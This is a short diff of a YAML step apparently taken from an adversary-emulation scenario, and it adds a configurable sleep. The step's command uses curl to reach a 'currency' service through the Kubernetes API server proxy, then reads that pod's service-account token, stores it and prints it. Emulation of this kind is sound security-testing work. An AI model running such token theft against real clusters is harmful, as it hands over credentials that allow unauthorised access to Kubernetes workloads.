@@ -6,4 +6,4 @@
   repeatable: false
   singleton: true
   platforms:
-    linux: { sh: { command: "curl -sk \"https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT/api/v1/namespaces/$NSPROTO/services/currency:8081/proxy/var/run/secrets/kubernetes.io/serviceaccount/token\" > $DATA_PATH/KC3/tokenCurrency && cat $DATA_PATH/KC3/tokenCurrency", timeout: 30 } }
+    linux: { sh: { command: "sleep $W306 && curl -sk \"https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT/api/v1/namespaces/$NSPROTO/services/currency:8081/proxy/var/run/secrets/kubernetes.io/serviceaccount/token\" > $DATA_PATH/KC3/tokenCurrency && cat $DATA_PATH/KC3/tokenCurrency", timeout: 30 } }
